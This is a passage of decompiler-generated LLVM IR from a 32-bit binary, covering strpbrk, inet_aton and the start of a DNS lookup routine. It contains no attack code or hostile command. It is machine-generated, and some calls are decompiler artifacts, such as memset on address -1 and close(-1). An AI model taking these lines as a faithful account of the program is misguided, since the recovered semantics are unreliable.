  %v2_804bd11 = add i32 %v0_804bd11, %v8_804bd09
  store i32 %v2_804bd11, i32* @ebx, align 4
  %v1_804bd13 = inttoptr i32 %v2_804bd11 to i8*
  %v2_804bd13 = load i8, i8* %v1_804bd13, align 1
  %v3_804bd13 = icmp eq i8 %v2_804bd13, 0
  %v1_804bd16 = icmp eq i1 %v3_804bd13, false
  br i1 %v1_804bd16, label %dec_label_pc_804bd1e, label %dec_label_pc_804bd18

dec_label_pc_804bd18:                             ; preds = %dec_label_pc_804bd05
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804bd1a = load i32, i32* @esi, align 4
  %v2_804bd1a = inttoptr i32 %v1_804bd1a to i32*
  store i32 %v2_804bd11, i32* %v2_804bd1a, align 4
  %v0_804bd48.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd45

dec_label_pc_804bd1e:                             ; preds = %dec_label_pc_804bd05
  %v0_804bd1e = load i32, i32* @edx, align 4
  %v0_804bd20 = load i32, i32* @edi, align 4
  %v8_804bd22 = call i32 @__GI_strpbrk(i8* %v1_804bd13, i32 %v0_804bd20, i32 %v0_804bd1e, i32 %v0_804bd1e)
  store i32 %v8_804bd22, i32* %eax.global-to-local, align 4
  %v2_804bd2a = icmp eq i32 %v8_804bd22, 0
  %v1_804bd2c = icmp eq i1 %v2_804bd2a, false
  br i1 %v1_804bd2c, label %dec_label_pc_804bd3d, label %dec_label_pc_804bd2e

dec_label_pc_804bd2e:                             ; preds = %dec_label_pc_804bd1e
  %v0_804bd32 = load i32, i32* @ebx, align 4
  %v5_804bd32 = inttoptr i32 %v0_804bd32 to i8*
  %v8_804bd33 = call i32 @rawmemchr(i8* %v5_804bd32, i32 0, i32 %v8_804bd22, i32 %v8_804bd22)
  br label %dec_label_pc_804bd41

dec_label_pc_804bd3d:                             ; preds = %dec_label_pc_804bd1e
  %v9_804bd22 = inttoptr i32 %v8_804bd22 to i8*
  store i8 0, i8* %v9_804bd22, align 1
  %v2_804bd40 = add i32 %v8_804bd22, 1
  br label %dec_label_pc_804bd41

dec_label_pc_804bd41:                             ; preds = %dec_label_pc_804bd2e, %dec_label_pc_804bd3d
  %storemerge = phi i32 [ %v2_804bd40, %dec_label_pc_804bd3d ], [ %v8_804bd33, %dec_label_pc_804bd2e ]
  %v0_804bd41 = phi i32 [ %v2_804bd40, %dec_label_pc_804bd3d ], [ %v8_804bd33, %dec_label_pc_804bd2e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_804bd41 = load i32, i32* @esi, align 4
  %v2_804bd41 = inttoptr i32 %v1_804bd41 to i32*
  store i32 %v0_804bd41, i32* %v2_804bd41, align 4
  %v0_804bd43 = load i32, i32* @ebx, align 4
  store i32 %v0_804bd43, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd45

dec_label_pc_804bd45:                             ; preds = %dec_label_pc_804bd18, %dec_label_pc_804bd41
  %v0_804bd48 = phi i32 [ %v0_804bd48.pre, %dec_label_pc_804bd18 ], [ %v0_804bd43, %dec_label_pc_804bd41 ]
  %v2_804bd45 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bd45, i32* @ebx, align 4
  store i32 %v0_804bcf1, i32* @esi, align 4
  store i32 %v0_804bcf0, i32* @edi, align 4
  ret i32 %v0_804bd48

; uselistorder directives
  uselistorder i32 %v8_804bd22, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bd45, { 1, 0 }
  uselistorder label %dec_label_pc_804bd41, { 1, 0 }
  uselistorder label %dec_label_pc_804bd05, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804bd4d = load i32, i32* @ebx, align 4
  %v2_804bd6424 = load i8, i8* %arg1, align 1
  %v4_804bd6628 = icmp eq i8 %v2_804bd6424, 0
  br i1 %v4_804bd6628, label %dec_label_pc_804bd6e, label %dec_label_pc_804bd6a.lr.ph

dec_label_pc_804bd6a.lr.ph:                       ; preds = %entry
  %v3_804bd6425 = zext i8 %v2_804bd6424 to i32
  %v5_804bd6426 = and i32 %v0_804bd4d, -256
  %v6_804bd6427 = or i32 %v3_804bd6425, %v5_804bd6426
  %v4_804bd52 = ptrtoint i8* %arg1 to i32
  %v1_804bd5d13 = inttoptr i32 %arg2 to i8*
  %v4_804bd5d.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804bd6a

dec_label_pc_804bd58:                             ; preds = %dec_label_pc_804bd6a, %dec_label_pc_804bd5c
  %v6_804bd5d22 = phi i32 [ %v6_804bd5d, %dec_label_pc_804bd5c ], [ %v6_804bd5d17, %dec_label_pc_804bd6a ]
  %v2_804bd5d21 = phi i8 [ %v2_804bd5d, %dec_label_pc_804bd5c ], [ %v2_804bd5d14, %dec_label_pc_804bd6a ]
  %v0_804bd5c20 = phi i32 [ %v1_804bd5c, %dec_label_pc_804bd5c ], [ %arg2, %dec_label_pc_804bd6a ]
  %v15_804bd58 = icmp eq i8 %v2_804bd5d21, %v2_804bd6431
  br i1 %v15_804bd58, label %dec_label_pc_804bd70, label %dec_label_pc_804bd5c

dec_label_pc_804bd5c:                             ; preds = %dec_label_pc_804bd58
  %v1_804bd5c = add i32 %v0_804bd5c20, 1
  store i32 %v1_804bd5c, i32* @edx, align 4
  %v1_804bd5d = inttoptr i32 %v1_804bd5c to i8*
  %v2_804bd5d = load i8, i8* %v1_804bd5d, align 1
  %v3_804bd5d = zext i8 %v2_804bd5d to i32
  %v5_804bd5d = and i32 %v6_804bd5d22, -256
  %v6_804bd5d = or i32 %v3_804bd5d, %v5_804bd5d
  store i32 %v6_804bd5d, i32* @ecx, align 4
  %v4_804bd5f = icmp eq i8 %v2_804bd5d, 0
  %v1_804bd61 = icmp eq i1 %v4_804bd5f, false
  br i1 %v1_804bd61, label %dec_label_pc_804bd58, label %dec_label_pc_804bd63

dec_label_pc_804bd63:                             ; preds = %dec_label_pc_804bd5c, %dec_label_pc_804bd6a
  %v4_804bd5d.pre34 = phi i32 [ %v6_804bd5d17, %dec_label_pc_804bd6a ], [ %v6_804bd5d, %dec_label_pc_804bd5c ]
  %v1_804bd63 = add i32 %v0_804bd6329, 1
  %v1_804bd64 = inttoptr i32 %v1_804bd63 to i8*
  %v2_804bd64 = load i8, i8* %v1_804bd64, align 1
  %v3_804bd64 = zext i8 %v2_804bd64 to i32
  %v5_804bd64 = and i32 %v6_804bd6432, -256
  %v6_804bd64 = or i32 %v3_804bd64, %v5_804bd64
  %v4_804bd66 = icmp eq i8 %v2_804bd64, 0
  br i1 %v4_804bd66, label %dec_label_pc_804bd6e, label %dec_label_pc_804bd6a

dec_label_pc_804bd6a:                             ; preds = %dec_label_pc_804bd6a.lr.ph, %dec_label_pc_804bd63
  %v4_804bd5d.pre = phi i32 [ %v4_804bd5d.pre.pre, %dec_label_pc_804bd6a.lr.ph ], [ %v4_804bd5d.pre34, %dec_label_pc_804bd63 ]
  %v6_804bd6432 = phi i32 [ %v6_804bd6427, %dec_label_pc_804bd6a.lr.ph ], [ %v6_804bd64, %dec_label_pc_804bd63 ]
  %v2_804bd6431 = phi i8 [ %v2_804bd6424, %dec_label_pc_804bd6a.lr.ph ], [ %v2_804bd64, %dec_label_pc_804bd63 ]
  %v0_804bd6329 = phi i32 [ %v4_804bd52, %dec_label_pc_804bd6a.lr.ph ], [ %v1_804bd63, %dec_label_pc_804bd63 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804bd5d14 = load i8, i8* %v1_804bd5d13, align 1
  %v3_804bd5d15 = zext i8 %v2_804bd5d14 to i32
  %v5_804bd5d16 = and i32 %v4_804bd5d.pre, -256
  %v6_804bd5d17 = or i32 %v3_804bd5d15, %v5_804bd5d16
  store i32 %v6_804bd5d17, i32* @ecx, align 4
  %v4_804bd5f18 = icmp eq i8 %v2_804bd5d14, 0
  %v1_804bd6119 = icmp eq i1 %v4_804bd5f18, false
  br i1 %v1_804bd6119, label %dec_label_pc_804bd58, label %dec_label_pc_804bd63

dec_label_pc_804bd6e:                             ; preds = %dec_label_pc_804bd63, %entry
  br label %dec_label_pc_804bd70

dec_label_pc_804bd70:                             ; preds = %dec_label_pc_804bd58, %dec_label_pc_804bd6e
  %v0_804bd72 = phi i32 [ 0, %dec_label_pc_804bd6e ], [ %v0_804bd6329, %dec_label_pc_804bd58 ]
  store i32 %v0_804bd4d, i32* @ebx, align 4
  ret i32 %v0_804bd72

; uselistorder directives
  uselistorder i32 %v6_804bd5d17, { 2, 0, 1 }
  uselistorder i8 %v2_804bd5d14, { 1, 2, 0 }
  uselistorder i32 %v1_804bd63, { 1, 0 }
  uselistorder i32 %v6_804bd5d, { 1, 2, 0 }
  uselistorder i8 %v2_804bd5d, { 1, 2, 0 }
  uselistorder i32 %v1_804bd5c, { 2, 1, 0 }
  uselistorder i8 %v2_804bd6424, { 0, 2, 1 }
  uselistorder i32 %v0_804bd4d, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bd70, { 1, 0 }
  uselistorder label %dec_label_pc_804bd6a, { 1, 0 }
  uselistorder label %dec_label_pc_804bd63, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804bd7b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bd7b, i32* @ecx, align 4
  %v1_804bd7f = icmp eq i8* %arg1, null
  br i1 %v1_804bd7f, label %dec_label_pc_804be00, label %dec_label_pc_804bd83

dec_label_pc_804bd83:                             ; preds = %entry
  %v0_804bd91.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804bd8e

dec_label_pc_804bd8e:                             ; preds = %dec_label_pc_804bd83, %dec_label_pc_804bdd7
  %v2_804bdda35 = phi i32 [ 1, %dec_label_pc_804bd83 ], [ %v3_804bdda, %dec_label_pc_804bdd7 ]
  %v0_804bd8e34 = phi i32 [ %v4_804bd7b, %dec_label_pc_804bd83 ], [ %v0_804bd8e3, %dec_label_pc_804bdd7 ]
  %v0_804bdf533 = phi i32 [ 0, %dec_label_pc_804bd83 ], [ %v2_804bddd, %dec_label_pc_804bdd7 ]
  %v1_804bd8e = inttoptr i32 %v0_804bd8e34 to i8*
  %v2_804bd8e = load i8, i8* %v1_804bd8e, align 1
  %v3_804bd8e = sext i8 %v2_804bd8e to i32
  %v2_804bd97 = mul nsw i32 %v3_804bd8e, 2
  %v3_804bd97 = add i32 %v2_804bd97, %v0_804bd91.pre
  %v4_804bd97 = inttoptr i32 %v3_804bd97 to i8*
  %v5_804bd97 = load i8, i8* %v4_804bd97, align 1
  %v6_804bd97 = and i8 %v5_804bd97, 8
  %v7_804bd97 = icmp eq i8 %v6_804bd97, 0
  br i1 %v7_804bd97, label %dec_label_pc_804be00, label %dec_label_pc_804bd9e

dec_label_pc_804bd9e:                             ; preds = %dec_label_pc_804bd8e
  %v4_804bdb2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804bdb2

dec_label_pc_804bda2:                             ; preds = %dec_label_pc_804bdb2
  %v3_804bda2 = mul i32 %v1_804bda2, 10
  %v2_804bda5 = add i32 %v3_804bda2, -48
  %v3_804bda5 = add i32 %v2_804bda5, %v2_804bdb4
  %v1_804bda9 = add i32 %v3_804bda5, -255
  %v6_804bda9 = sub i32 254, %v3_804bda5
  %v7_804bda9 = and i32 %v6_804bda9, %v3_804bda5
  %v8_804bda9 = icmp slt i32 %v7_804bda9, 0
  %v9_804bda9 = icmp eq i32 %v1_804bda9, 0
  %v10_804bda9 = icmp slt i32 %v1_804bda9, 0
  %v3_804bdaf = icmp eq i1 %v10_804bda9, %v8_804bda9
  %v4_804bdaf = icmp eq i1 %v9_804bda9, false
  %v5_804bdaf = and i1 %v4_804bdaf, %v3_804bdaf
  br i1 %v5_804bdaf, label %dec_label_pc_804be00, label %dec_label_pc_804bdb1

dec_label_pc_804bdb1:                             ; preds = %dec_label_pc_804bda2
  %v1_804bdb1 = add i32 %v0_804bdb1, 1
  store i32 %v1_804bdb1, i32* @ecx, align 4
  br label %dec_label_pc_804bdb2

dec_label_pc_804bdb2:                             ; preds = %dec_label_pc_804bd9e, %dec_label_pc_804bdb1
  %v1_804bda2 = phi i32 [ 0, %dec_label_pc_804bd9e ], [ %v3_804bda5, %dec_label_pc_804bdb1 ]
  %v4_804bdb2 = phi i32 [ %v4_804bdb2.pre, %dec_label_pc_804bd9e ], [ %v6_804bdb2, %dec_label_pc_804bdb1 ]
  %v0_804bdb1 = phi i32 [ %v0_804bd8e34, %dec_label_pc_804bd9e ], [ %v1_804bdb1, %dec_label_pc_804bdb1 ]
  %v1_804bdb2 = inttoptr i32 %v0_804bdb1 to i8*
  %v2_804bdb2 = load i8, i8* %v1_804bdb2, align 1
  %v3_804bdb2 = zext i8 %v2_804bdb2 to i32
  %v5_804bdb2 = and i32 %v4_804bdb2, -256
  %v6_804bdb2 = or i32 %v3_804bdb2, %v5_804bdb2
  store i32 %v6_804bdb2, i32* @edx, align 4
  %v2_804bdb4 = sext i8 %v2_804bdb2 to i32
  %v2_804bdb7 = mul nsw i32 %v2_804bdb4, 2
  %v3_804bdb7 = add i32 %v2_804bdb7, %v0_804bd91.pre
  %v4_804bdb7 = inttoptr i32 %v3_804bdb7 to i16*
  %v5_804bdb7 = load i16, i16* %v4_804bdb7, align 2
  %v2_804bdbc = and i16 %v5_804bdb7, 8
  %v3_804bdbc = icmp eq i16 %v2_804bdbc, 0
  %v1_804bdbe = icmp eq i1 %v3_804bdbc, false
  br i1 %v1_804bdbe, label %dec_label_pc_804bda2, label %dec_label_pc_804bdc0

dec_label_pc_804bdc0:                             ; preds = %dec_label_pc_804bdb2
  %v8_804bdc0 = sub nsw i32 2, %v2_804bdda35
  %v9_804bdc0 = and i32 %v8_804bdc0, %v2_804bdda35
  %v10_804bdc0 = icmp slt i32 %v9_804bdc0, 0
  %v11_804bdc0 = icmp eq i32 %v2_804bdda35, 3
  %v12_804bdc0 = icmp slt i32 %v2_804bdda35, 3
  %v3_804bdc4 = icmp eq i1 %v12_804bdc0, %v10_804bdc0
  %v4_804bdc4 = icmp eq i1 %v11_804bdc0, false
  %v5_804bdc4 = and i1 %v4_804bdc4, %v3_804bdc4
  br i1 %v5_804bdc4, label %dec_label_pc_804bdce, label %dec_label_pc_804bdc6

dec_label_pc_804bdc6:                             ; preds = %dec_label_pc_804bdc0
  %v10_804bdc6 = icmp eq i8 %v2_804bdb2, 46
  %v1_804bdc9 = icmp eq i1 %v10_804bdc6, false
  br i1 %v1_804bdc9, label %dec_label_pc_804be00, label %dec_label_pc_804bdcb

dec_label_pc_804bdcb:                             ; preds = %dec_label_pc_804bdc6
  %v1_804bdcb = add i32 %v0_804bdb1, 1
  store i32 %v1_804bdcb, i32* @ecx, align 4
  br label %dec_label_pc_804bdd7

dec_label_pc_804bdce:                             ; preds = %dec_label_pc_804bdc0
  %v1_804bdce = add i32 %v0_804bdb1, 1
  store i32 %v1_804bdce, i32* @ecx, align 4
  %v4_804bdcf = icmp eq i8 %v2_804bdb2, 0
  br i1 %v4_804bdcf, label %dec_label_pc_804bdd7, label %dec_label_pc_804bdd3

dec_label_pc_804bdd3:                             ; preds = %dec_label_pc_804bdce
  %v2_804bdd3 = and i16 %v5_804bdb7, 32
  %v3_804bdd3 = icmp eq i16 %v2_804bdd3, 0
  br i1 %v3_804bdd3, label %dec_label_pc_804be00, label %dec_label_pc_804bdd7

dec_label_pc_804bdd7:                             ; preds = %dec_label_pc_804bdd3, %dec_label_pc_804bdce, %dec_label_pc_804bdcb
  %v0_804bd8e3 = phi i32 [ %v1_804bdce, %dec_label_pc_804bdd3 ], [ %v1_804bdce, %dec_label_pc_804bdce ], [ %v1_804bdcb, %dec_label_pc_804bdcb ]
  %v2_804bdd7 = mul i32 %v0_804bdf533, 256
  %v3_804bdda = add nuw nsw i32 %v2_804bdda35, 1
  %v2_804bddd = or i32 %v1_804bda2, %v2_804bdd7
  %v7_804bde3 = icmp sgt i32 %v2_804bdda35, 3
  br i1 %v7_804bde3, label %dec_label_pc_804bde5, label %dec_label_pc_804bd8e

dec_label_pc_804bde5:                             ; preds = %dec_label_pc_804bdd7
  %v4_804bdea = icmp eq i32 %arg2, 0
  br i1 %v4_804bdea, label %dec_label_pc_804be02, label %dec_label_pc_804bdf1

dec_label_pc_804bdf1:                             ; preds = %dec_label_pc_804bde5
  %v1_804bdf5 = call i32 @llvm.bswap.i32(i32 %v2_804bddd)
  %v2_804bdf7 = inttoptr i32 %arg2 to i32*
  store i32 %v1_804bdf5, i32* %v2_804bdf7, align 4
  br label %dec_label_pc_804be02

dec_label_pc_804be00:                             ; preds = %dec_label_pc_804bdd3, %dec_label_pc_804bdc6, %dec_label_pc_804bd8e, %dec_label_pc_804bda2, %entry
  br label %dec_label_pc_804be02

dec_label_pc_804be02:                             ; preds = %dec_label_pc_804bde5, %dec_label_pc_804bdf1, %dec_label_pc_804be00
  %v0_804be07 = phi i32 [ 1, %dec_label_pc_804bde5 ], [ 1, %dec_label_pc_804bdf1 ], [ 0, %dec_label_pc_804be00 ]
  ret i32 %v0_804be07

; uselistorder directives
  uselistorder i32 %v2_804bdb4, { 1, 0 }
  uselistorder i32 %v6_804bdb2, { 1, 0 }
  uselistorder i8 %v2_804bdb2, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804bdb1, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804bda9, { 1, 0 }
  uselistorder i32 %v3_804bda5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804bd8e34, { 1, 0 }
  uselistorder i32 %v2_804bdda35, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804be02, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804be00, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804bdb2, { 1, 0 }
  uselistorder label %dec_label_pc_804bd8e, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_804be1e = call i32 @malloc(i32 512)
  store i32 %v2_804be1e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_804be1e, i32* @ebp, align 4
  %v2_804be2c = call i32 @malloc(i32 1025)
  store i32 %v2_804be2c, i32* %eax.global-to-local, align 4
  %v12_804be35 = ptrtoint i32* %stack_var_-236 to i32
  %v1_804be38 = icmp eq i32 %v2_804be1e, 0
  br i1 %v1_804be38, label %dec_label_pc_804c4b1, label %dec_label_pc_804be40

dec_label_pc_804be40:                             ; preds = %entry
  %v1_804be40 = icmp eq i32 %v2_804be2c, 0
  br i1 %v1_804be40, label %dec_label_pc_804c4b1, label %dec_label_pc_804be48

dec_label_pc_804be48:                             ; preds = %dec_label_pc_804be40
  %v5_804be48 = icmp eq i32 %arg2, 0
  br i1 %v5_804be48, label %dec_label_pc_804c4b1, label %dec_label_pc_804be56

dec_label_pc_804be56:                             ; preds = %dec_label_pc_804be48
  %v4_804be56 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804be56, i32* %eax.global-to-local, align 4
  %v2_804be5d = load i8, i8* %arg1, align 1
  %v3_804be5d = icmp eq i8 %v2_804be5d, 0
  br i1 %v3_804be5d, label %dec_label_pc_804c4b1, label %dec_label_pc_804be66

dec_label_pc_804be66:                             ; preds = %dec_label_pc_804be56
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_804be6a = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_804be6a, i32* @eax, align 4
  store i32 %v4_804be56, i32* %edx.global-to-local, align 4
  %v2_804be8d = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804be8d, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_804be95 = call i32 @__pthread_return_void(i32 %v2_804be8d, i32 134526427)
  store i32 %v3_804be95, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_8052528.84 to i8*), i8** %stack_var_-252, align 4
  %v2_804bea1 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_8052528.84 to i32))
  %v0_804bea6 = load i64, i64* @global_var_8052540.85, align 8
  %v1_804bea6 = trunc i64 %v0_804bea6 to i32
  %v1_804beab = ashr i32 %v1_804bea6, 31
  %v6_804beac = and i64 %v0_804bea6, 4294967295
  %v8_804beac = zext i32 %v1_804beab to i64
  %v9_804beac = mul nuw i64 %v8_804beac, 4294967296
  %v10_804beac = or i64 %v9_804beac, %v6_804beac
  %v14_804beac = srem i64 %v10_804beac, %tmp33
  %v15_804beac = trunc i64 %v14_804beac to i32
  %v0_804beb3 = load i16, i16* @global_var_805215c.86, align 4
  %v2_804bec2 = load i8*, i8** %stack_var_-252, align 4
  %v3_804bec2 = ptrtoint i8* %v2_804bec2 to i32
  store i32 %v3_804bec2, i32* @eax, align 4
  store i32 134526427, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_804bec7 = call i32 @__pthread_return_void(i32 %v2_804be8d, i32 1)
  store i32 %v3_804bec7, i32* %eax.global-to-local, align 4
  %v3_804bf0b = sext i16 %v0_804beb3 to i32
  %v5_804c06e = inttoptr i32 %v15_804beac to i8*
  %v1_804c48c87 = add i32 %v12_804be35, 28
  %v2_804c48c88 = inttoptr i32 %v1_804c48c87 to i32*
  %v3_804c48c89 = load i32, i32* %v2_804c48c88, align 4
  %tmp119 = icmp ult i32 %v3_804c48c89, 3
  br i1 %tmp119, label %dec_label_pc_804beec, label %dec_label_pc_804c4b1

dec_label_pc_804beec:                             ; preds = %dec_label_pc_804be66, %dec_label_pc_804c48c.backedge
  %v0_804bef392 = phi i32 [ %v0_804c48c.pre, %dec_label_pc_804c48c.backedge ], [ %v12_804be35, %dec_label_pc_804be66 ]
  %v1_804beec = add i32 %v0_804bef392, 20
  %v2_804beec = inttoptr i32 %v1_804beec to i32*
  %v3_804beec = load i32, i32* %v2_804beec, align 4
  %v13_804beec = icmp eq i32 %v3_804beec, -1
  br i1 %v13_804beec, label %dec_label_pc_804beec.dec_label_pc_804bf02_crit_edge, label %dec_label_pc_804bef3

dec_label_pc_804beec.dec_label_pc_804bf02_crit_edge: ; preds = %dec_label_pc_804beec
  %v0_804bf02.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf02

dec_label_pc_804bef3:                             ; preds = %dec_label_pc_804beec
  %v3_804bef6 = load i32, i32* %v2_804beec, align 4
  %v5_804bef6 = add i32 %v0_804bef392, -16
  %v6_804bef6 = inttoptr i32 %v5_804bef6 to i32*
  store i32 %v3_804bef6, i32* %v6_804bef6, align 4
  %v1_804befa = call i32 @__libc_close(i32 -1)
  store i32 %v1_804befa, i32* %eax.global-to-local, align 4
  %v0_804beff = load i32, i32* @esp, align 4
  %v1_804beff = add i32 %v0_804beff, 16
  br label %dec_label_pc_804bf02

dec_label_pc_804bf02:                             ; preds = %dec_label_pc_804beec.dec_label_pc_804bf02_crit_edge, %dec_label_pc_804bef3
  %v1_804bf02 = phi i32 [ %v0_804bef392, %dec_label_pc_804beec.dec_label_pc_804bf02_crit_edge ], [ %v1_804beff, %dec_label_pc_804bef3 ]
  %v0_804bf02 = phi i32 [ %v0_804bf02.pre, %dec_label_pc_804beec.dec_label_pc_804bf02_crit_edge ], [ %v1_804befa, %dec_label_pc_804bef3 ]
  %v2_804bf02 = add i32 %v1_804bf02, -4
  %v3_804bf02 = inttoptr i32 %v2_804bf02 to i32*
  store i32 %v0_804bf02, i32* %v3_804bf02, align 4
  %v1_804bf03 = add i32 %v1_804bf02, -8
  %v2_804bf03 = inttoptr i32 %v1_804bf03 to i32*
  store i32 512, i32* %v2_804bf03, align 4
  %v1_804bf08 = add i32 %v1_804bf02, -12
  %v2_804bf08 = inttoptr i32 %v1_804bf08 to i32*
  store i32 0, i32* %v2_804bf08, align 4
  %v2_804bf0a = add i32 %v1_804bf02, -16
  %v3_804bf0a = inttoptr i32 %v2_804bf0a to i32*
  store i32 %v2_804be1e, i32* %v3_804bf0a, align 4
  %v5_804bf0b = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804beac, i32 %v3_804bf0b)
  store i32 %v5_804bf0b, i32* %eax.global-to-local, align 4
  %v0_804bf10 = load i32, i32* @esp, align 4
  %v1_804bf13 = add i32 %v0_804bf10, 8
  %v2_804bf13 = inttoptr i32 %v1_804bf13 to i32*
  store i32 48, i32* %v2_804bf13, align 4
  %v1_804bf15 = add i32 %v0_804bf10, 4
  %v2_804bf15 = inttoptr i32 %v1_804bf15 to i32*
  store i32 0, i32* %v2_804bf15, align 4
  %v1_804bf17 = add i32 %v0_804bf10, 84
  store i32 %v1_804bf17, i32* @ebx, align 4
  %v3_804bf1b = inttoptr i32 %v0_804bf10 to i32*
  store i32 %v1_804bf17, i32* %v3_804bf1b, align 4
  %v5_804bf1c = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_804beac, i32 %v3_804bf0b)
  store i32 %v5_804bf1c, i32* %eax.global-to-local, align 4
  %v0_804bf21 = load i32, i32* @esp, align 4
  %v1_804bf21 = add i32 %v0_804bf21, 60
  %v2_804bf21 = inttoptr i32 %v1_804bf21 to i32*
  %v3_804bf21 = load i32, i32* %v2_804bf21, align 4
  store i32 %v3_804bf21, i32* %eax.global-to-local, align 4
  %v1_804bf25 = add i32 %v0_804bf21, 116
  %v2_804bf25 = inttoptr i32 %v1_804bf25 to i32*
  store i32 1, i32* %v2_804bf25, align 4
  %v0_804bf2d = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf2d = add i32 %v0_804bf2d, 1
  %v0_804bf2e = load i32, i32* @esp, align 4
  %v1_804bf2e = add i32 %v0_804bf2e, 104
  %v2_804bf2e = inttoptr i32 %v1_804bf2e to i32*
  store i32 1, i32* %v2_804bf2e, align 4
  %v1_804bf36 = urem i32 %v1_804bf2d, 65536
  store i32 %v1_804bf36, i32* %eax.global-to-local, align 4
  %v1_804bf3b = load i32, i32* @esp, align 4
  %v2_804bf3b = add i32 %v1_804bf3b, 60
  %v3_804bf3b = inttoptr i32 %v2_804bf3b to i32*
  store i32 %v1_804bf36, i32* %v3_804bf3b, align 4
  %v0_804bf3f = load i32, i32* %eax.global-to-local, align 4
  %v1_804bf3f = load i32, i32* @esp, align 4
  %v2_804bf3f = add i32 %v1_804bf3f, 84
  %v3_804bf3f = inttoptr i32 %v2_804bf3f to i32*
  store i32 %v0_804bf3f, i32* %v3_804bf3f, align 4
  %v0_804bf43 = load i32, i32* @esp, align 4
  %v1_804bf46 = add i32 %v0_804bf43, 8
  %v2_804bf46 = inttoptr i32 %v1_804bf46 to i32*
  store i32 512, i32* %v2_804bf46, align 4
  %v2_804bf4b = add i32 %v0_804bf43, 4
  %v3_804bf4b = inttoptr i32 %v2_804bf4b to i32*
  store i32 %v2_804be1e, i32* %v3_804bf4b, align 4
  %v0_804bf4c = load i32, i32* @ebx, align 4
  %v3_804bf4c = inttoptr i32 %v0_804bf43 to i32*
  store i32 %v0_804bf4c, i32* %v3_804bf4c, align 4
  %v0_804bf4d = call i32 @__encode_header()
  store i32 %v0_804bf4d, i32* %eax.global-to-local, align 4
  %v0_804bf52 = load i32, i32* @esp, align 4
  store i32 %v0_804bf4d, i32* @ebx, align 4
  %v2_804bf57 = icmp slt i32 %v0_804bf4d, 0
  br i1 %v2_804bf57, label %dec_label_pc_804c4b1, label %dec_label_pc_804bf5f

dec_label_pc_804bf5f:                             ; preds = %dec_label_pc_804bf02
  %v2_804bf5f = add i32 %v0_804bf52, 12
  %v3_804bf5f = inttoptr i32 %v2_804bf5f to i32*
  store i32 %v0_804bf4d, i32* %v3_804bf5f, align 4
  %v1_804bf60 = add i32 %v0_804bf52, 8
  %v2_804bf60 = inttoptr i32 %v1_804bf60 to i32*
  store i32 1025, i32* %v2_804bf60, align 4
  %v1_804bf65 = add i32 %v0_804bf52, 256
  %v2_804bf65 = inttoptr i32 %v1_804bf65 to i32*
  %v3_804bf65 = load i32, i32* %v2_804bf65, align 4
  %v5_804bf65 = add i32 %v0_804bf52, 4
  %v6_804bf65 = inttoptr i32 %v5_804bf65 to i32*
  store i32 %v3_804bf65, i32* %v6_804bf65, align 4
  %v1_804bf6c = add i32 %v0_804bf52, 28
  %v2_804bf6c = inttoptr i32 %v1_804bf6c to i32*
  %v3_804bf6c = load i32, i32* %v2_804bf6c, align 4
  %v6_804bf6c = inttoptr i32 %v0_804bf52 to i32*
  store i32 %v3_804bf6c, i32* %v6_804bf6c, align 4
  %v6_804bf70 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_804beac, i32 %v3_804bf0b, i32 ptrtoint (i32* @0 to i32))
  %v0_804bf75 = load i32, i32* @esp, align 4
